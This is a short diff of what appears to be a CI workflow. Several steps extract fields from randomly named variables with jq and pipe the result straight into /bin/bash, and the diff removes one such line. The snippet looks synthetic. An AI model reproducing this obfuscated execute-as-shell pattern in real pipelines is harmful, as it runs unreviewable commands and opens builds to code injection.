@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$pjqfz54" | jq -r .vjs7808 | /bin/bash
           echo $mffcc6 | jq -r .bmxn09267 | /bin/bash
           echo $lnwzc20436 | jq -r .ixx55338 | /bin/bash
-          echo $xn921 | jq -r .gzr2748 | /bin/bash
           printf '%s' "$n62622" | jq -r .peq1716 | /bin/bash
 
       - name: Archive output
